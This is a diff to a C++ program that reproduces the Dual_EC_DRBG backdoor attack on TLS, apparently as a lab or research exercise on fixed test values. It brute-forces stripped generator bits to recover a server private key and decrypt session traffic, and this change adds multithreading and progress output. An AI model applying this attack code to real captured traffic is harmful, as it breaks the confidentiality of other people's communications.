@@ -14,12 +14,15 @@
 #include <vector>
 #include <mbedtls/ssl.h>
 #include "dualec.h"
+#include <queue>
+#include <future>
 
 #define TLS_ATTACK_DETERMINISTIC
 
 constexpr auto MASTER_SECRET_LEN = 48;
 
 static auto* cipher_info = mbedtls_cipher_info_from_type(MBEDTLS_CIPHER_CHACHA20_POLY1305);
+static BigInt no_of_threads = 8;
 
 barr expect_premaster ={0xdb, 0x39, 0xe0, 0xb2, 0x91, 0x1c, 0x20, 0x7d, 0xdb, 0xf5, 0x2d, 0x6a, 0xac, 0x47, 0x29, 0xdf, 0xfe, 0x41, 0x70, 0xf0, 0x32, 0xe5, 0x55, 0x0d, 0x4f, 0x73, 0x94, 0xcc, 0xc3, 0x40, 0x7f, 0xf9, 0xcc, 0x15, 0x4a, 0x43, 0xa3, 0x4e, 0xbc, 0xe1, 0x52, 0x43, 0x8f, 0x8e, 0xc8, 0x68, 0x5d, 0x46, 0x0e, 0x0f, 0x48, 0x7d, 0x3f, 0x4f, 0x18, 0x24, 0x78, 0xf9, 0x8b, 0x7e, 0x56, 0x57, 0xa0, 0xca, 0xe9, 0x92, 0xa1, 0xec, 0xde, 0xe6, 0x1b, 0xab, 0xfb, 0x98, 0x9a, 0x89, 0xf1, 0x30, 0xb6, 0x79, 0xaf, 0x15, 0x67, 0x07, 0xe6, 0x09, 0x86, 0x90, 0xc0, 0x16, 0xa6, 0xf6, 0x22, 0x6d, 0x68, 0x05, 0x39, 0xba, 0x80, 0x1e, 0x78, 0xfc, 0x86, 0xce, 0xc0, 0xe7, 0xf6, 0xb3, 0x5e, 0xdb, 0xcc, 0x96, 0xfa, 0x24, 0x2c, 0xe1, 0x4f, 0x29, 0x24, 0xfc, 0xd1, 0x9d, 0xb4, 0x92, 0xe3, 0xd0, 0x01, 0xad, 0xc6, 0x39, 0xa5, 0x30, 0x47, 0x9b, 0x00, 0x6a, 0xe0, 0xa2, 0xa6, 0xc7, 0x15, 0xd9, 0x2f, 0xd8, 0x74, 0xd3, 0xd3, 0x9c, 0xb8, 0x54, 0xb7, 0x4e, 0x6c, 0xc0, 0x1e, 0xd4, 0x50, 0x47, 0x1c, 0x47, 0x2e, 0x6c, 0xb2, 0x09, 0x8b, 0xfb, 0x23, 0x2f, 0x19, 0x33, 0xde, 0xe5, 0x0a, 0xa8, 0x68, 0xfd, 0xf9, 0x63, 0x1f, 0x9f, 0x47, 0xdc, 0x2b, 0x5c, 0x24, 0x2b, 0x9b, 0x7d, 0xdd, 0xe2, 0x59, 0x76, 0x60, 0x8a, 0x3e, 0xf4, 0x91, 0xbe, 0xa6, 0x53, 0x8f, 0xcf, 0xa3, 0xa3, 0xd3, 0x97, 0xf5, 0xdf, 0x31, 0xaa, 0xc4, 0x42, 0x51, 0x25, 0xda, 0xe7, 0x8b, 0xfa, 0xcc, 0x02, 0xed, 0x9e, 0x35, 0x04, 0xee, 0xef, 0x3b, 0x63, 0x5c, 0xa7, 0x88, 0x84, 0x84, 0xfd, 0xab, 0x22, 0x96, 0x2b, 0x6d, 0xdb, 0x87, 0xf9, 0x37, 0x0f, 0xe8, 0x18, 0x39, 0x15, 0x7d, 0x24, 0xb5, 0x59, 0x13, 0x34, 0x49, 0x56};
 barr expect_master_secret={0xac, 0xbe, 0x54, 0x3f, 0x17, 0x2f, 0xcf, 0x9a, 0x8a, 0x47, 0x97, 0xdc, 0x24, 0xc4, 0xc0, 0x2e, 0x6b, 0x22, 0xeb, 0x45, 0x9d, 0x4a, 0x0f, 0x17, 0x87, 0xed, 0x54, 0x13, 0x21, 0xce, 0x11, 0x4b, 0x7f, 0xea, 0xb0, 0x20, 0x3f, 0x4a, 0x43, 0x3d, 0x7e, 0xc3, 0x70, 0x5e, 0xdd, 0x1a, 0x6f, 0x90};
@@ -252,48 +255,105 @@ std::optional<BigInt> try_calc_private_key(BitStr const& guessed_stripped_bits, 
 
 struct Iterator {
     Iterator(BigInt start, BigInt end_excl)
-        : start(std::move(start))
-        , end(std::move(end_excl))
+        : m_start(std::move(start))
+        , m_end(std::move(end_excl))
         , m_current(start - 1)
     {
     }
-    BigInt start;
-    BigInt end;
-    [[nodiscard]] BigInt current() const { if (m_current >= end) abort();
+    BigInt m_start;
+    BigInt m_end;
+    [[nodiscard]] BigInt current() const { if (m_current >= m_end) abort();
         return m_current; }
-    [[nodiscard]] bool has_next() const { return m_current + 1 < end; }
+    [[nodiscard]] bool has_next() const { return m_current + 1 < m_end; }
     BigInt advance() { return ++m_current; }
+    [[nodiscard]] int percentage() const { return (current()-m_start+2)*100 / (m_end-m_start); }
 private:
     BigInt m_current;
 };
 
+static std::queue<std::shared_future<std::optional<BitStr>>> workers;
+static std::vector<int> finished_worker;
+static std::vector<int> progess;
+
+static void push_worker(std::function<std::optional<BitStr>()> func)
+{
+    workers.push(std::async(std::launch::async, func));
+}
+
 BigInt guess_server_private_key(BitStr const& inner_dec_serv_rand, Input const& input)
 {
-    auto stripped_amount_of_bits = DEC::pick_seedlen(input.dec_security_strength) - DEC::calculate_max_outlen(DEC::pick_seedlen(input.dec_security_strength));
-    auto full_amound_stripped = stripped_amount_of_bits + 4*8;
+    std::stop_source stop_source;
 
+    auto stripped_amount_of_bits = DEC::pick_seedlen(input.dec_security_strength) - DEC::calculate_max_outlen(DEC::pick_seedlen(input.dec_security_strength));
+    auto amount_unix_time_stripped = 4*8;
+    auto full_amound_stripped = stripped_amount_of_bits + amount_unix_time_stripped;
+
+    std::cout << "Amount of bits to brute force: " << full_amound_stripped << std::endl;
     /* Step 2: Guess the last 4 bytes (because they were stripped to make room for the unix timestamp)
      *         and the stripped bits from the front */
     auto strip_bound = BigInt(1) << full_amound_stripped;
     auto strip_per_thread = strip_bound / no_of_threads;
 
-    for (BigInt thread_start(0), thread_end(strip_per_thread); thread_end <= strip_bound; thread_end += strip_per_thread, thread_start += strip_per_thread) {
-        auto lambda = [thread_start, thread_end, full_amound_stripped, stripped_amount_of_bits, &inner_dec_serv_rand, &input]() {
+    progess.resize(no_of_threads);
+    finished_worker.resize(no_of_threads);
+    auto* progress_bucket = &progess[0];
+    auto* finish_bucket = &finished_worker[0];
+    for (BigInt thread_start(0), thread_end(strip_per_thread); thread_end <= strip_bound; thread_end += strip_per_thread, thread_start += strip_per_thread, ++progress_bucket, ++finish_bucket) {
+        auto lambda = [progress_bucket,finish_bucket, amount_unix_time_stripped, &stop_source, thread_start, thread_end, full_amound_stripped, stripped_amount_of_bits, &inner_dec_serv_rand, &input]() -> std::optional<BitStr> {
              auto working_state = DEC::WorkingState {
                 .s = BitStr(-1),
                 .seedlen = DEC::pick_seedlen(input.dec_security_strength),
                 .dec_curve = input.dec_curve,
                 .outlen = DEC::calculate_max_outlen(DEC::pick_seedlen(input.dec_security_strength))};
             auto guesser = Iterator(thread_start, thread_end);
-            while (guesser.has_next()) {
+            auto stoken = stop_source.get_token();
+            while (guesser.has_next() && !stoken.stop_requested()) {
+                *progress_bucket = guesser.percentage();
                 auto guess = BitStr(guesser.advance(), full_amound_stripped);
-                BitStr guessed_last4 = guess.truncated_leftmost(4*8);
+                BitStr guessed_last4 = guess.truncated_leftmost(amount_unix_time_stripped);
                 BitStr guessed_stripped_bits = guess.truncated_rightmost(stripped_amount_of_bits);
                 auto result = try_calc_private_key(guessed_stripped_bits,guessed_last4, inner_dec_serv_rand, input, working_state);
-                if (result.has_value())
+                if (result.has_value()) {
+                    stop_source.request_stop();
+                    *finish_bucket = 1;
                     return result;
+                }
             }
+            *finish_bucket = 1;
+            return {};
         };
+        push_worker(lambda);
+    }
+
+    std::cout << "Progress:" << std::endl;
+    for (size_t i = 0; i < no_of_threads; ++i)
+        std::cout << " T" << std::setfill('0') << std::setw(2) << i << " ";
+    std::cout << std::endl;
+    auto stoken = stop_source.get_token();
+    while (!stoken.stop_requested()) {
+        bool all_done = true;
+        for (auto const& f : finished_worker)
+            if (!f)
+                all_done = false;
+        if (all_done)
+            break;
+        std::cout << "\r";
+        for (auto const& p : progess)
+            std::cout << std::setfill(' ') << std::right << std::setw(3) << p << "% ";
+        std::cout << std::flush;
+        std::this_thread::sleep_for(std::chrono::milliseconds(250));
+    }
+    std::cout << std::endl;
+
+
+    while (!workers.empty()) {
+        auto ret = workers.front().get(); // blocking until finished by stop_source
+        if (ret.has_value()) {
+            while (!workers.empty())
+                workers.pop();
+            return ret.value().as_big_int();
+        }
+        workers.pop();
     }
     std::cout << "Unexpected end of brute force" << std::endl;
     abort();
@@ -313,6 +373,7 @@ int main()
     /* Step 1: Strip the first 4 bytes of server-random, because it's the unix timestamp. */
     BitStr inner_dec_serv_rand = bitstr_from_barr(barr(input.server_random.begin() + 4, input.server_random.end()));
     BigInt server_private = guess_server_private_key(inner_dec_serv_rand, input);
+    std::cout << "SUCCESS!!!" << std::endl;
     /* Step 6: Calculate the pre-master-secret with pubKeyClient^a (mod p) */
     /* Step 7: Calculate the master secret with the given information */
     /* Step 8: Calculate the working_keys and decrpyt the message */
